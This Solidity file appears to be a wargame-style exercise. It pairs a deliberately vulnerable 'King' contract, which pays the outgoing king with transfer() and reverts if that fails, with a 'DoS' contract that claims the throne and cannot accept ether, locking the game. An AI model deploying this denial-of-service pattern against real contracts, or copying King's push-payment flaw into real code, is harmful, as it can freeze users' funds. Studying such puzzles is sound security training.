// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract DoS {
    King kingContract;

    constructor(address _king) {
        kingContract = King(payable(_king));
    }

    function dos() external payable {
        console.log("dos reached");
        (bool sent, ) = payable(address(kingContract)).call{value: msg.value}(
            ""
        );
        require(sent, "Failed to send eth");
    }
}

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        console.log(msg.value);
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
        console.log(king);
        console.log(prize);
    }

    function _king() public view returns (address) {
        return king;
    }
}
